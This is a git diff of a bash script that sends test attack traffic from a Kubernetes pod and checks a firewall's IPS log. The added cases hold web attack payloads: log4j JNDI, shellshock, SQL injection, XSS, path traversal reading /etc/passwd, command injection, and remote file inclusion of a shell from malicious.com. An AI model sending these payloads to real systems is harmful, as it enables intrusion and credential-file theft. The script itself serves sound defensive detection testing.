@@ -40,23 +40,55 @@ function test_diag2() {
     local cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[0].metadata.name}')
 
    
+
+
     case "$payload_type" in
-	    normal)
-            local payload='curl -s -I --max-time 5'
-	    local logfile_name="traffic.0"
-             ;;
-	    log4j)
-	    local payload='curl -s --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
-	    ;; 
-            shellshock)
-            local payload='curl -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
-	    local logfile_name="ips.0"
-	    ;;
-            *)
-            local payload='curl -s -I --max-time 5'
-	    local logfile_name="ips.0"
-	    ;;
-    esac 
+    normal)
+        local payload='curl -s -I --max-time 5'
+        local logfile_name="traffic.0"
+        ;;
+    log4j)
+        local payload='curl -s --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
+        local logfile_name="ips.0"
+        ;;
+    shellshock)
+        local payload='curl -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
+        local logfile_name="ips.0"
+        ;;
+    sql_injection)
+        local payload='curl -s --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
+        local logfile_name="ips.0"
+        ;;
+    xss)
+        local payload='curl -s --max-time 5 --data "search=<script>alert(1)</script>"'
+        local logfile_name="ips.0"
+        ;;
+    lfi)
+        local payload='curl -s --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
+        local logfile_name="ips.0"
+        ;;
+    rfi)
+        local payload='curl -s --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
+        local logfile_name="ips.0"
+        ;;
+    cmd_injection)
+        local payload='curl -s --max-time 5 --data "input=1; cat /etc/passwd"'
+        local logfile_name="ips.0"
+        ;;
+    directory_traversal)
+        local payload='curl -s --max-time 5 "http://target.com/../../../../etc/passwd"'
+        local logfile_name="ips.0"
+        ;;
+    user_agent_malware)
+        local payload='curl -s --max-time 5 -H "User-Agent: BlackSun"'
+        local logfile_name="ips.0"
+        ;;
+    *)
+        local payload='curl -s -I --max-time 5'
+        local logfile_name="ips.0"
+        ;;
+esac
+
 
     run_curl_in_pod "$payload" "$service_address"
     echo "kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}"
@@ -76,6 +108,7 @@ function print_usage() {
     echo "  [target_service_name]     : Name of the target service.       Default: juiceshop"
     echo "  [target_service_namespace]: Namespace of the target service.  Default: security"
     echo "  [traffic type]:             traffic type of log4j,shellshock,normal, Default:normal"
+    echo "  [traffic type]:    xss,lfi,rfi,user_agent_malware,directory_traversal,sql_injection"
     echo "  [logfilename]:             traffic type of log4j,shellshock,normal, Default:traffic.0"
     echo ""
     echo "Example usages:"
